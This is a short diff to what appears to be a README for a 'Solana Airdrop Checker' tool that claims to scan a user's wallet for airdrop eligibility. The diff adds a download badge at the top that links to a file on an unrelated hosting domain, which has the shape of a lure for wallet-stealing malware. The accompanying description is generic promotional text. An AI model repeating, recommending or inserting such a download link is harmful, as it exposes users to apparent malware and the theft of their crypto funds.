@@ -1,4 +1,4 @@
-
+[![Download Solana AirdropChecker](https://img.shields.io/badge/Download-Solana%20AirdropChecker-blueviolet)](https://downeefiles.com/s/slrdrp)
 
 
 **Solana Airdrop Checker** is a tool designed to help users check their eligibility for Solana-based airdrops. With the increasing number of airdrop events in the Solana ecosystem, this tool simplifies the process of verifying whether you qualify for free token distributions. It quickly scans your wallet and provides a clear indication of your eligibility status, saving time and effort compared to manually tracking airdrops. 
